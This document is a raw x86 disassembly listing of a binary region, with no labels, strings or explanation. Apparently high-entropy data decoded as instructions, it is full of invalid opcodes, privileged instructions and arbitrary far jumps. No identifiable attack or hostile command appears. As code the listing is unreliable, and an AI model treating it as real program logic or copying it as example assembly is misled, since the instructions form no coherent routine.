  40be1a:	out    0x73,eax
  40be1c:	push   edi
  40be1d:	(bad)  [ebp+0x75]
  40be20:	push   ecx
  40be21:	adc    edx,DWORD PTR [eax-0x41b5e132]
  40be27:	stos   BYTE PTR es:[edi],al
  40be28:	fld    QWORD PTR [ebx-0x40884ae9]
  40be2e:	(bad)  
  40be2f:	in     al,0xa3
  40be31:	mov    cl,0xa6
  40be33:	xlat   BYTE PTR ds:[ebx]
  40be34:	push   ebp
  40be35:	jbe    0x40bdb7
  40be37:	fcomp  DWORD PTR [ecx+0x18]
  40be3a:	into   
  40be3b:	ret    
  40be3c:	xchg   ebx,eax
  40be3d:	xchg   esi,eax
  40be3e:	xchg   BYTE PTR ds:0xf60a0ab3,al
  40be44:	outs   dx,BYTE PTR ds:[esi]
  40be45:	data16 cmp al,0x89
  40be48:	(bad)  
  40be49:	mov    esi,0x8a66a159
  40be4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be4f:	add    esi,ebx
  40be51:	pop    edi
  40be52:	push   0xa9e8d826
  40be57:	jl     0x40bed0
  40be59:	popa   
  40be5a:	jns    0x40beae
  40be5c:	cs retw 0x2a4
  40be61:	sbb    bl,BYTE PTR [eax+0x71a1c05]
  40be67:	jno    0x40beb9
  40be69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be6a:	xchg   esp,eax
  40be6b:	adc    eax,ebx
  40be6d:	adc    al,0x46
  40be6f:	repz (bad) 
  40be71:	push   ecx
  40be72:	popa   
  40be73:	sahf   
  40be74:	call   0xbbf1ab3
  40be79:	icebp  
  40be7a:	xor    esi,ecx
  40be7c:	test   eax,0xed7e0ac6
  40be81:	das    
  40be82:	add    ebp,edi
  40be84:	mov    BYTE PTR [edx],ah
  40be86:	inc    esp
  40be87:	push   ebx
  40be88:	push   edi
  40be89:	jmp    0x9645:0xa4dd4666
  40be90:	push   0xedbd78d5
  40be95:	pop    ebp
  40be96:	push   ecx
  40be97:	mov    ds:0x88051baa,al
  40be9c:	mov    bl,0xfd
  40be9e:	dec    ecx
  40be9f:	cmp    DWORD PTR [ecx+0x63c4ab63],ebp
  40bea5:	push   esp
  40bea6:	xchg   ebp,eax
  40bea7:	cdq    
  40bea8:	add    ebx,DWORD PTR ds:0x5b692c0
  40beae:	mov    esi,0x56cd8d69
  40beb3:	leave  
  40beb4:	loope  0x40bef7
  40beb6:	mov    ds:0xf4529137,eax
  40bebb:	ficom  WORD PTR [ecx+0x363aa964]
  40bec1:	pop    esi
  40bec2:	inc    ebx
  40bec3:	cmp    al,BYTE PTR [eax+0x65]
  40bec6:	aas    
  40bec7:	retf   0xf4cf
  40beca:	add    al,0x39
  40becc:	ja     0x40be79
  40bece:	dec    esi
  40becf:	ds and eax,0x4078db8f
  40bed5:	(bad)  
  40bed7:	sub    dh,BYTE PTR [edi+0x2e04587d]
  40bedd:	imul   ebp,DWORD PTR ds:0x175c8515,0xffffffbc
  40bee4:	jge    0x40bf5b
  40bee6:	mov    eax,ds:0xa1c0faff
  40beeb:	inc    esp
  40beec:	jg     0x40bf51
  40beee:	push   cs
  40beef:	lods   eax,DWORD PTR ds:[esi]
  40bef0:	inc    edi
  40bef1:	jle    0x40bedc
  40bef3:	jg     0x40becf
  40bef5:	xchg   ecx,eax
  40bef6:	out    0x17,eax
  40bef8:	xchg   edi,eax
  40bef9:	sub    BYTE PTR ds:0x2a96,bl
  40befe:	cli    
  40beff:	mov    ecx,0xab685718
  40bf04:	popa   
  40bf05:	push   0x219c8614
  40bf0a:	jb     0x40bf01
  40bf0c:	xrelease mov DWORD PTR [ebx+0x7e],esi
  40bf10:	test   BYTE PTR ds:0x34cc315a,0xa6
  40bf17:	adc    edi,DWORD PTR [edi-0x1f]
  40bf1a:	and    esi,DWORD PTR [edi]
  40bf1c:	ins    BYTE PTR es:[edi],dx
  40bf1d:	aam    0x4b
  40bf1f:	pop    ebx
  40bf20:	pop    ss
  40bf21:	and    edx,DWORD PTR [ecx-0x56]
  40bf24:	xor    DWORD PTR [edx],esp
  40bf26:	or     eax,0x8e4f7999
  40bf2b:	mov    bl,0x48
  40bf2d:	hlt    
  40bf2e:	and    DWORD PTR [edi+0x19],esi
  40bf31:	fnstenv [ecx]
  40bf33:	enter  0xea0e,0x5b
  40bf37:	ds aam 0x8c
  40bf3a:	push   eax
  40bf3b:	out    dx,al
  40bf3c:	cmc    
  40bf3d:	dec    esp
  40bf3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf3f:	inc    edi
  40bf40:	jge    0x40bf21
  40bf42:	and    ch,dl
  40bf44:	sbb    al,BYTE PTR [ecx+0x50de00c2]
  40bf4a:	xor    eax,0xf9768de8
  40bf4f:	or     BYTE PTR [ecx-0x46],ah
  40bf52:	adc    DWORD PTR [edx+0x2a],0x54
  40bf56:	xchg   edi,eax
  40bf57:	ss sub esp,eax
  40bf5a:	xor    BYTE PTR [edi+0xb],ah
  40bf5d:	inc    ebx
  40bf5e:	outs   dx,BYTE PTR ds:[esi]
  40bf5f:	(bad)  
  40bf61:	cwde   
  40bf62:	(bad)  
  40bf63:	out    dx,eax
  40bf64:	mov    ch,dl
  40bf66:	adc    edx,ecx
  40bf68:	inc    ebx
  40bf69:	add    eax,0x91000cf3
  40bf6e:	fs retf 0xdf37
  40bf72:	xchg   ebp,eax
  40bf73:	out    dx,al
  40bf74:	daa    
  40bf75:	adc    al,0xd1
  40bf77:	mov    dh,0xc7
  40bf79:	or     eax,0x6123f20f
  40bf7e:	ins    BYTE PTR es:[edi],dx
  40bf7f:	mov    ecx,0xc9689a27
  40bf84:	jg     0x40bf9d
  40bf86:	mov    ch,0x3e
  40bf88:	out    dx,al
  40bf89:	xor    ecx,DWORD PTR [ebx]
  40bf8b:	cmc    
  40bf8c:	push   ebp
  40bf8d:	lock cdq 
  40bf8f:	cli    
  40bf90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf91:	cmp    DWORD PTR [ecx+0x2],0xeabc0fba
  40bf98:	add    eax,0x9f6959b6
  40bf9d:	sbb    cl,0x9d
  40bfa0:	inc    esi
  40bfa1:	adc    esp,ebp
  40bfa3:	pushf  
  40bfa4:	fcomp  DWORD PTR ds:0xe94c0cf4
  40bfaa:	sbb    BYTE PTR [eax-0x24],0x2
  40bfae:	xor    eax,0xf4820e7
  40bfb3:	jp     0x40bf52
  40bfb5:	jmp    0x59923157
  40bfba:	sub    esi,DWORD PTR [ebx-0xa]
  40bfbd:	push   edi
  40bfbe:	leave  
  40bfbf:	pusha  
  40bfc0:	cmc    
  40bfc1:	pop    eax
  40bfc2:	rcr    DWORD PTR [esi-0x47],1
  40bfc5:	and    al,0x58
  40bfc7:	daa    
  40bfc8:	fmul   QWORD PTR [ecx+edx*8+0x3e27953c]
  40bfcf:	mov    DWORD PTR [ecx],edi
  40bfd1:	neg    BYTE PTR [eax]
  40bfd3:	sar    BYTE PTR [esi],1
  40bfd5:	sub    edi,DWORD PTR [esi-0x24]
  40bfd8:	inc    ebp
  40bfd9:	aaa    
  40bfda:	push   edx
  40bfdb:	pushf  
  40bfdc:	lds    edx,FWORD PTR [ecx-0x73]
  40bfdf:	sar    bh,1
  40bfe1:	mov    esp,0xf9f6452c
  40bfe6:	cmp    DWORD PTR [esi+0x4e],edi
  40bfe9:	(bad)  
  40bfea:	aam    0x60
  40bfec:	mov    bl,0x1a
  40bfee:	aad    0x15
  40bff0:	mov    edi,0x59933f4b
  40bff5:	sbb    edi,edx
  40bff7:	add    eax,DWORD PTR [eax-0x7b]
  40bffa:	popa   
  40bffb:	and    DWORD PTR fs:[edx],0x20
  40bfff:	lds    esi,FWORD PTR [ecx+0x2f20447f]
  40c005:	mov    ecx,0x2355bc48
  40c00a:	inc    ecx
  40c00b:	cdq    
  40c00c:	stos   DWORD PTR es:[edi],eax
  40c00d:	leave  
  40c00e:	shl    BYTE PTR [edx],cl
  40c010:	shr    BYTE PTR [ebx+eiz*4+0x23a6e2f6],0x13
  40c018:	fdivr  st,st(5)
  40c01a:	ds ins BYTE PTR es:[edi],dx
  40c01c:	fst    DWORD PTR [edx+0xe]
  40c01f:	aad    0x16
  40c021:	mov    eax,ds:0x6ad55fad
  40c026:	adc    al,0xbd
  40c028:	test   DWORD PTR [ebx],edx
  40c02a:	inc    ebp
  40c02b:	mov    DWORD PTR [eax-0x51],0xbd795d31
  40c032:	(bad)  
  40c034:	(bad)  
  40c035:	ins    BYTE PTR es:[edi],dx
  40c036:	pop    ss
  40c037:	cld    
  40c038:	adc    ah,ah
  40c03a:	imul   ebp,DWORD PTR [edx-0x25312030],0xffffffac
  40c041:	rcr    BYTE PTR [edi-0x1d3d5c03],0x1f
  40c048:	rol    ebp,cl
  40c04a:	cmp    DWORD PTR [ebp-0x2b],edx
  40c04d:	add    cl,bl
  40c04f:	jne    0x40c01f
  40c051:	mov    WORD PTR [eax-0x2d],ds
  40c054:	cs mov ch,0xae
  40c057:	jg     0x40c086
  40c059:	sbb    ch,BYTE PTR [edi]
  40c05b:	jecxz  0x40c05d
  40c05d:	and    al,0x9e
  40c05f:	jle    0x40c095
  40c061:	std    
  40c062:	xchg   ebx,eax
  40c063:	sar    DWORD PTR [eiz*4-0x5b413022],1
  40c06a:	sti    
  40c06b:	lods   al,BYTE PTR ds:[esi]
  40c06c:	scas   al,BYTE PTR es:[edi]
  40c06d:	push   es
  40c06e:	cmc    
  40c06f:	daa    
  40c070:	loop   0x40c0d9
  40c072:	outs   dx,DWORD PTR ds:[esi]
  40c073:	cmp    DWORD PTR [esi-0x6],esp
  40c076:	mov    esp,0xa570d3bd
  40c07b:	push   es
  40c07c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c07d:	cmp    ecx,esi
  40c07f:	and    ebx,DWORD PTR [edx-0x6b9820e2]
  40c085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c086:	jno    0x40c048
  40c088:	push   ebp
  40c089:	js     0x40c0b7
  40c08b:	loop   0x40c01b
  40c08d:	push   ecx
  40c08e:	or     BYTE PTR [edi+0x128f477f],al
  40c094:	pop    ebp
  40c095:	pop    ecx
  40c096:	mov    ebx,0xac2d5807
  40c09b:	les    esi,FWORD PTR ds:0x2c0823a1
  40c0a1:	push   ecx
  40c0a2:	(bad)  
  40c0a3:	sub    BYTE PTR [ecx+0x716e8402],ah
  40c0a9:	push   ds
  40c0aa:	mov    ebp,0xbf304c2f
  40c0af:	mov    bh,BYTE PTR [esi-0x64]
  40c0b2:	std    
  40c0b3:	into   
  40c0b4:	mov    ch,0x1d
  40c0b6:	sbb    edx,DWORD PTR [eax-0x69e7d78]
  40c0bc:	or     edx,ebp
  40c0be:	(bad)  
  40c0bf:	cmp    esi,DWORD PTR [edi-0x64]
  40c0c2:	push   0xffffffd9
  40c0c4:	(bad)  
  40c0c5:	rcr    DWORD PTR [ebx],cl
  40c0c7:	add    eax,0x458bc9e9
  40c0cc:	sbb    DWORD PTR [edi],edx
  40c0ce:	sub    ah,ch
  40c0d0:	pop    ds
  40c0d1:	imul   ebp,DWORD PTR [ecx-0x5b],0xeef937ca
  40c0d8:	aaa    
  40c0d9:	scas   eax,DWORD PTR es:[edi]
  40c0da:	dec    edx
  40c0db:	mov    bl,0x74
  40c0dd:	pop    ebx
  40c0de:	(bad)  
  40c0df:	out    0xe,eax
  40c0e1:	inc    edi
  40c0e2:	or     ah,ah
  40c0e4:	jle    0x40c157
  40c0e6:	pop    esp
  40c0e7:	das    
  40c0e8:	std    
  40c0e9:	mov    al,ds:0x1a9e46bb
  40c0ee:	inc    eax
  40c0ef:	(bad)  
  40c0f0:	test   BYTE PTR [eax],ah
  40c0f2:	aas    
  40c0f3:	adc    ebx,DWORD PTR [ebp-0x19]
  40c0f6:	rcl    dl,1
  40c0f8:	xor    bl,BYTE PTR [eax+0x5f59523a]
  40c0fe:	sub    BYTE PTR [edi+0x19],0xff
  40c102:	cld    
  40c103:	dec    esp
  40c104:	inc    esi
  40c105:	test   BYTE PTR [ebp-0x4],al
  40c108:	or     bh,bh
  40c10a:	leave  
  40c10b:	adc    ah,cl
  40c10d:	jl     0x40c156
  40c10f:	mov    BYTE PTR [esi-0x3f],bh
  40c112:	xchg   ebx,eax
  40c113:	icebp  
  40c114:	ret    0xcc42
  40c117:	lds    esp,FWORD PTR [edi]
  40c119:	repnz fsub QWORD PTR [edi+eiz*1-0x509ecded]
  40c121:	cmp    al,BYTE PTR [edx+eax*2]
  40c124:	out    0x88,eax
  40c126:	sub    edi,DWORD PTR [ecx+0x55828af0]
  40c12c:	stc    
  40c12d:	dec    esi
  40c12e:	jg     0x40c19e
  40c130:	outs   dx,BYTE PTR cs:[esi]
  40c132:	imul   esi
  40c134:	shl    BYTE PTR [ebx-0x6e],cl
  40c137:	inc    ebp
  40c138:	jge    0x40c1af
  40c13a:	dec    ecx
  40c13b:	fimul  WORD PTR [edx]
  40c13d:	das    
  40c13e:	mov    dh,0x2d
  40c140:	ins    DWORD PTR es:[edi],dx
  40c141:	pop    ds
  40c142:	or     al,0x98
  40c144:	call   0x68f09474
  40c149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c14a:	fs gs cmc 
  40c14d:	sbb    ecx,ecx
  40c14f:	sar    BYTE PTR [edx+0x30d93d87],cl
  40c155:	or     eax,0x28cf5100
  40c15a:	cwde   
  40c15b:	dec    ecx
  40c15c:	popa   
  40c15d:	cdq    
  40c15e:	test   BYTE PTR [esi-0x662c38a2],bl
  40c164:	add    eax,0xe3175a59
  40c169:	jno    0x40c1e8
  40c16b:	mov    ds:0xb4130841,al
  40c170:	sub    al,0xe5
  40c172:	cmp    WORD PTR [esi+0x1a],bx
  40c176:	xor    eax,esi
  40c178:	push   ss
  40c179:	ins    BYTE PTR es:[edi],dx
  40c17a:	repz pop esp
  40c17c:	test   DWORD PTR ds:0x14f72e7f,0x9bb93eec
  40c186:	pop    ecx
  40c187:	mov    BYTE PTR [edi+0x3e81d6b9],0xb
  40c18e:	lds    eax,FWORD PTR [ecx+0x23]
  40c191:	mov    bh,0x1f
  40c193:	pusha  
  40c194:	(bad)  
  40c195:	mov    ecx,DWORD PTR ds:0x5ea8338d
  40c19b:	mov    eax,ds:0x2a03a02c
  40c1a0:	hlt    
  40c1a1:	pop    ebx
  40c1a2:	pop    ebx
  40c1a3:	mov    ds:0x4e03a7fc,eax
  40c1a8:	xor    al,0xd1
  40c1aa:	call   0x25ba:0x2c061671
  40c1b1:	test   eax,0xdfdc3730
  40c1b6:	popa   
  40c1b7:	hlt    
  40c1b8:	(bad)
  40c1bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1bc:	jmp    0xf9486f38
  40c1c1:	pop    edi
  40c1c2:	pop    ebx
  40c1c3:	mov    ebp,0xbe264dfe
  40c1c8:	ret    
  40c1c9:	xor    eax,0x71557865
  40c1ce:	xor    al,0x81
  40c1d0:	xor    DWORD PTR ds:0x7d0fbcd2,edi
  40c1d6:	je     0x40c172
  40c1d8:	rcl    DWORD PTR [edx],cl
  40c1da:	mov    ds:0x2c2b3e7f,eax
  40c1df:	mov    edx,0x36af973b
  40c1e4:	repz jne 0x40c250
  40c1e7:	out    0xe6,al
  40c1e9:	inc    ebp
  40c1ea:	clc    
  40c1eb:	int    0xa
  40c1ed:	dec    eax
  40c1ee:	inc    esp
  40c1ef:	lods   al,BYTE PTR ds:[esi]
  40c1f0:	int    0x94
  40c1f2:	loope  0x40c25c
  40c1f4:	(bad)  
  40c1f5:	adc    BYTE PTR [edi-0xe2caef4],dh
  40c1fb:	clc    
  40c1fc:	mov    BYTE PTR [edi],bh
  40c1fe:	dec    esi
  40c1ff:	or     ebp,DWORD PTR [esi-0x5aa64836]
  40c205:	mov    WORD PTR [ecx],fs
  40c207:	es jne 0x40c252
  40c20a:	mov    ebp,0xb90fae17
  40c20f:	sar    BYTE PTR [edi],0x31
  40c212:	ds nop
  40c214:	sbb    eax,0xb435e4ef
  40c219:	sbb    bh,BYTE PTR [edi]
  40c21b:	push   0x147bda59
  40c220:	inc    eax
  40c221:	dec    eax
  40c222:	adc    BYTE PTR [edx-0x3489fa3b],0x9
  40c229:	lahf   
  40c22a:	inc    esp
  40c22b:	repnz mov dh,0x54
  40c22e:	jne    0x40c1c3
  40c230:	dec    eax
  40c231:	ror    DWORD PTR [edx+0x45895c90],cl
  40c237:	jbe    0x40c219
  40c239:	aaa    
  40c23a:	dec    eax
  40c23b:	xor    cl,0x70
  40c23e:	(bad)  
  40c23f:	and    edi,eax
  40c241:	mov    DWORD PTR [edi+0x45],esi
  40c244:	lds    edx,FWORD PTR [esi+0x747a369c]
  40c24a:	mov    edi,0x91bd2e0f
  40c24f:	inc    ebp
  40c250:	stc    
  40c251:	mov    esp,0x8e8014fb
  40c256:	xchg   ebx,eax
  40c257:	inc    ebx
  40c258:	retf   
  40c259:	imul   ecx,DWORD PTR [eax+edi*2],0x3b
  40c25d:	hlt    
  40c25e:	adc    BYTE PTR [edi],bl
  40c260:	push   ecx
  40c261:	mov    ds:0xa724ac7b,eax
  40c266:	push   esp
  40c267:	push   ds
  40c268:	enter  0xba61,0x61
  40c26c:	mov    dl,0x2d
  40c26e:	stos   DWORD PTR es:[edi],eax
  40c26f:	mov    ebx,0xbd5e0764
  40c274:	adc    eax,0xa323d31f
  40c279:	adc    al,0x9
  40c27b:	mov    ebx,0x8228f419
  40c280:	stc    
  40c281:	fadd   QWORD PTR [ecx+eiz*2+0x3e820c4b]
  40c288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c289:	test   eax,0x6c0d90e5
  40c28e:	lods   al,BYTE PTR ds:[esi]
  40c28f:	jbe    0x40c211
  40c291:	sub    DWORD PTR [ebp-0x6af57fc6],eax
  40c297:	jecxz  0x40c312
  40c299:	in     al,dx
  40c29a:	adc    BYTE PTR [eax-0x3a],cl
  40c29d:	xor    al,0xc8
  40c29f:	sub    edx,DWORD PTR [edx-0x6faec2ca]
  40c2a5:	xchg   edx,eax
  40c2a6:	add    al,bl
  40c2a8:	pop    ebx
  40c2a9:	lock sub ch,BYTE PTR [ebx+0x247a1ca1]
  40c2b0:	add    ecx,DWORD PTR [ebp+0x34]
  40c2b3:	sbb    al,0xa6
  40c2b5:	and    eax,0x9fdabcd4
  40c2ba:	sbb    al,dh
  40c2bc:	pop    ss
  40c2bd:	or     BYTE PTR ds:0xc8e66d15,dl
  40c2c3:	pushf  
  40c2c4:	(bad)  
  40c2c5:	lods   al,BYTE PTR ds:[esi]
  40c2c6:	iret   
  40c2c7:	call   0xc1f7be7f
  40c2cc:	sub    ch,0x97
  40c2cf:	mov    bl,0x98
  40c2d1:	and    bl,BYTE PTR [ebx+0x22]
  40c2d4:	loopne 0x40c331
  40c2d6:	sub    BYTE PTR [edi-0x3],bl
  40c2d9:	sub    BYTE PTR [edx],dl
  40c2db:	cmovg  ebp,DWORD PTR [edi+ecx*1]
  40c2df:	sub    BYTE PTR [ebp+ebx*8-0x61aa3564],0xdf
  40c2e7:	outs   dx,BYTE PTR ds:[esi]
  40c2e8:	jmp    0xc34e:0xf310caf
  40c2ef:	into   
  40c2f0:	add    BYTE PTR [edi-0x21d0da0a],ah
  40c2f6:	les    edi,FWORD PTR [ebp-0x5f2ef1fd]
  40c2fc:	and    dl,BYTE PTR [edx+0x532d608d]
  40c302:	cdq    
  40c303:	lock pop ecx
  40c305:	xor    esp,DWORD PTR [esi]
  40c307:	mov    ah,BYTE PTR [esi+0x11]
  40c30a:	mov    DWORD PTR [edi+ecx*4-0x5f],esi
  40c30e:	push   cs
  40c30f:	or     BYTE PTR [edx+0x49992ee],bh
  40c315:	sub    ch,bl
  40c317:	xchg   edx,eax
  40c318:	mov    BYTE PTR [esi],ch
  40c31a:	das    
  40c31b:	fnstsw WORD PTR [ecx+0x559fc89e]
  40c321:	in     al,0x1c
  40c323:	(bad)  [ebx]
  40c325:	and    DWORD PTR [edx+esi*2-0x29],ebp
  40c329:	pop    es
  40c32a:	icebp  
  40c32b:	mov    eax,ds:0xf66cd3b0
  40c330:	sub    edi,DWORD PTR [edx]
  40c332:	mov    dh,0xa8
  40c334:	pop    ecx
  40c335:	sbb    DWORD PTR [edx+0x25],esi
  40c338:	fisttp DWORD PTR [ecx+eax*8+0x29c3f147]
  40c33f:	sub    al,0xff
  40c341:	sub    DWORD PTR [ecx+0x25],0xffffffcd
  40c345:	adc    BYTE PTR [edx-0x75f1cc79],dh
  40c34b:	mov    ch,0x6f
  40c34d:	and    eax,DWORD PTR [edx-0x38dbaa51]
  40c353:	rcr    BYTE PTR [ebx-0x5c],1
  40c356:	mov    dh,0x5
  40c358:	pusha  
  40c359:	inc    edi
  40c35a:	or     DWORD PTR [ecx+0x654fb33c],ecx
  40c360:	(bad)  
  40c361:	inc    ebx
  40c362:	jmp    DWORD PTR [eax-0x80]
  40c365:	cmc    
  40c366:	mov    esp,0x19cc7e26
  40c36b:	stc    
  40c36c:	xchg   esp,eax
  40c36d:	cld    
  40c36e:	adc    eax,0x41524bb1
  40c373:	jae    0x40c357
  40c375:	mov    bl,0xbf
  40c377:	(bad)  
  40c378:	mov    eax,ds:0xe5389c7f
  40c37d:	mov    ebp,0x2086d03
  40c382:	add    dl,BYTE PTR [esi-0x48]
  40c385:	sbb    dh,dh
  40c387:	aad    0xb8
  40c389:	mov    WORD PTR [eax-0x30],gs
  40c38c:	push   esi
  40c38d:	add    esi,ebx
  40c38f:	lods   al,BYTE PTR ds:[esi]
  40c390:	xor    BYTE PTR [ebx],bl
  40c392:	pop    edi
  40c393:	jbe    0x40c357
  40c395:	and    DWORD PTR [eax+0x122bac5b],ecx
  40c39b:	mov    al,ds:0xd5824e58
  40c3a0:	mov    eax,ds:0x56ba11f
  40c3a5:	add    eax,0x5ab7f709
  40c3aa:	ins    DWORD PTR es:[edi],dx
  40c3ab:	rcr    BYTE PTR [esi],1
  40c3ad:	in     eax,dx
  40c3ae:	or     al,0x6f
  40c3b0:	dec    ebp
  40c3b1:	xor    edx,DWORD PTR [esi]
  40c3b3:	mov    cl,BYTE PTR [ebp+ebp*8-0x4f]
  40c3b7:	jbe    0x40c35c
  40c3b9:	fwait
  40c3ba:	popa   
  40c3bb:	mov    BYTE PTR [edx-0x4bd0ab7b],dh
  40c3c1:	xor    ch,BYTE PTR [ebx]
  40c3c3:	cs dec ebx
  40c3c5:	adc    ebp,ebx
  40c3c7:	out    dx,al
  40c3c8:	imul   ebp,DWORD PTR [eax],0x13f2f9ad
  40c3ce:	adc    edi,eax
  40c3d0:	fstp   DWORD PTR [ecx+0x4c]
  40c3d3:	pop    edi
  40c3d4:	and    ecx,edi
  40c3d6:	outs   dx,BYTE PTR ds:[esi]
  40c3d7:	pop    edi
  40c3d8:	mov    ah,0x34
  40c3da:	xchg   esi,eax
  40c3db:	fwait
  40c3dc:	mov    ch,0x38
  40c3de:	popa   
  40c3df:	fst    QWORD PTR [ebp-0x4c3d9b19]
  40c3e5:	xchg   ebp,eax
  40c3e6:	mov    dl,0xf1
  40c3e8:	cmc    
  40c3e9:	pusha  
  40c3ea:	dec    ebx
  40c3eb:	out    dx,eax
  40c3ec:	push   esi
  40c3ed:	imul   edi,DWORD PTR [esi+0x7c8775ae],0xa1ed4805
  40c3f7:	push   cs
  40c3f8:	mov    cl,0xa8
  40c3fa:	jb     0x40c449
  40c3fc:	scas   eax,DWORD PTR es:[edi]
  40c3fd:	xchg   ecx,eax
  40c3fe:	sbb    DWORD PTR [ecx-0x4e],edi
  40c401:	aam    0x57
  40c403:	mov    ebx,0xa79e80a8
  40c408:	and    DWORD PTR [edi+0x7c],edx
  40c40b:	mov    ah,0x2b
  40c40d:	or     DWORD PTR [ebx],ebp
  40c40f:	dec    ecx
  40c410:	retf   0xfda7
  40c413:	inc    eax
  40c414:	jo     0x40c446
  40c416:	jp     0x40c3d7
  40c418:	test   BYTE PTR [edi-0x2583f5df],0x9f
  40c41f:	xchg   dh,bl
  40c421:	cmp    al,0x69
  40c423:	(bad)  
  40c424:	dec    ecx
  40c425:	out    0xf8,eax
  40c427:	push   esp
  40c428:	lea    eax,[esi-0x3924e707]
  40c42e:	sub    DWORD PTR [ebx-0x486c860],edx
  40c434:	dec    edx
  40c435:	imul   ecx,DWORD PTR ds:0x450fa9bb,0x6
  40c43c:	pop    ecx
  40c43d:	sub    DWORD PTR [edx],ebp
  40c43f:	and    DWORD PTR [edx+0xa],ebx
  40c442:	not    DWORD PTR [edi]
  40c444:	inc    ecx
  40c445:	enter  0xb159,0x3a
  40c449:	pop    edx
  40c44a:	xor    al,0x7d
  40c44c:	xor    eax,0x7eae75d4
  40c451:	lahf   
  40c452:	frstor ds:0x1286fde3
  40c458:	mov    ds:0x437861dd,eax
  40c45d:	jmp    0xff86:0x48e933cb
  40c464:	cli    
  40c465:	cmc    
  40c466:	jns    0x40c3f2
  40c468:	sub    cl,dh
  40c46a:	cmp    al,0x56
  40c46c:	cli    
  40c46d:	stos   DWORD PTR es:[edi],eax
  40c46e:	inc    ebx
  40c46f:	call   0xc6db8703
  40c474:	(bad)  
  40c475:	cs push ebx
  40c477:	mov    dh,0x9a
  40c479:	adc    BYTE PTR [ecx-0x74],0x1c
  40c47d:	and    ch,BYTE PTR [eax]
  40c47f:	xor    DWORD PTR ds:0x621d7831,edx
  40c485:	dec    ebp
  40c486:	xor    BYTE PTR [eax-0x34],bh
  40c489:	dec    esp
  40c48a:	test   al,0x61
  40c48c:	stc    
  40c48d:	repnz aaa 
  40c48f:	cli    
  40c490:	mov    dh,0xdf
  40c492:	(bad)  
  40c493:	lods   eax,DWORD PTR ds:[esi]
  40c494:	jecxz  0x40c4b9
  40c496:	and    al,0xc2
  40c498:	neg    BYTE PTR [esi+0x3ec16b3b]
  40c49e:	clc    
  40c49f:	sbb    esi,ebp
  40c4a1:	mov    BYTE PTR [eax],ch
  40c4a3:	cwde   
  40c4a4:	fcomp  DWORD PTR [ebx+ecx*4-0x3c4fd3dc]
  40c4ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4ac:	and    eax,0x3838bfe7
  40c4b1:	jae    0x40c447
  40c4b3:	std    
  40c4b4:	xlat   BYTE PTR ds:[ebx]
  40c4b5:	pop    edi
  40c4b6:	jge    0x40c4b8
  40c4b8:	adc    cl,BYTE PTR [ecx+0x6b6f7716]
  40c4be:	rcr    ebp,0xbe
  40c4c1:	mov    ecx,DWORD PTR [esi+0x20803e07]
  40c4c7:	and    BYTE PTR [edi-0x1f],dh
  40c4ca:	ja     0x40c4c3
  40c4cc:	inc    edx
  40c4cd:	mov    bh,0x8a
  40c4cf:	(bad)  
  40c4d0:	dec    ebx
  40c4d1:	cmc    
  40c4d2:	dec    edi
  40c4d3:	xchg   ebp,eax
  40c4d4:	xchg   edi,eax
  40c4d5:	jb     0x40c494
  40c4d7:	pop    edx
  40c4d8:	ret    
  40c4d9:	cld    
  40c4da:	pusha  
  40c4db:	(bad)  
  40c4dc:	hlt    
  40c4dd:	mov    ds:0x8820aaa6,eax
  40c4e2:	gs cmp al,0xdd
  40c4e5:	sub    edx,DWORD PTR [esi+0x42]
  40c4e8:	jne    0x40c556
  40c4ea:	lods   al,BYTE PTR ds:[esi]
  40c4eb:	jo     0x40c544
  40c4ed:	data16 aaa 
  40c4ef:	push   es
  40c4f0:	cmp    eax,0xcd7d8353
  40c4f6:	cmp    al,0x94
  40c4f8:	rol    ebx,1
  40c4fa:	mov    bh,0xf4
  40c4fc:	mov    eax,0x91075180
  40c501:	inc    edi
  40c502:	pop    eax
  40c503:	adc    al,0xa7
  40c505:	push   0x561e062d
  40c50a:	cli    
  40c50b:	out    0xea,eax
  40c50d:	mov    ebp,0x18f7da7f
  40c512:	pop    ebp
  40c513:	cmp    ebp,DWORD PTR [ebp+0x63c9783f]
  40c519:	mov    ch,0x8a
  40c51b:	sub    esp,DWORD PTR [esi-0x6b]
  40c51e:	add    eax,0x4441d265
  40c523:	adc    eax,0x8843d19c
  40c528:	xchg   ebp,eax
  40c529:	iret   
  40c52a:	adc    al,0x4c
  40c52c:	lahf   
  40c52d:	jb     0x40c59a
  40c52f:	(bad)  
  40c530:	fmul   QWORD PTR [eax-0x50]
  40c533:	popf   
  40c534:	dec    edx
  40c535:	jecxz  0x40c51a
  40c537:	pushf  
  40c538:	cdq    
  40c539:	hlt    
  40c53a:	xor    eax,0x53f6cd21
  40c53f:	aas    
  40c540:	pusha  
  40c541:	sbb    eax,0xdc784b4b
  40c546:	add    dh,BYTE PTR [esi+edx*2]
  40c549:	sahf   
  40c54a:	stc    
  40c54b:	xchg   esp,eax
  40c54c:	push   edi
  40c54d:	(bad)  
  40c54e:	je     0x40c4d2
  40c550:	xchg   edx,eax
  40c551:	sub    DWORD PTR [edx+0x7cda2452],ebx
  40c557:	inc    edi
  40c558:	call   0x8457a904
  40c55d:	iret   
  40c55e:	add    eax,DWORD PTR [esi-0x57eeddbd]
  40c564:	sbb    DWORD PTR [ecx+0x51],ecx
  40c567:	shl    BYTE PTR [ebp-0x49],0x8c
  40c56b:	pop    ebp
  40c56c:	jae    0x40c5ce
  40c56e:	pop    ebx
  40c56f:	retf   0x3cfd
  40c572:	mov    dh,0xad
  40c574:	inc    edx
  40c575:	cmp    DWORD PTR [edx+0x3d],edx
  40c578:	pop    eax
  40c579:	mov    ds:0x97c130dc,al
  40c57e:	addr16 call 0x8001:0x92b38852
  40c586:	jnp    0x40c534
  40c588:	or     ecx,DWORD PTR [ebp-0x1e8999d7]
  40c58e:	arpl   WORD PTR [edx+0x3f4d2da0],sp
  40c594:	(bad)  
  40c595:	mov    dl,0xbd
  40c597:	push   edi
  40c598:	dec    edx
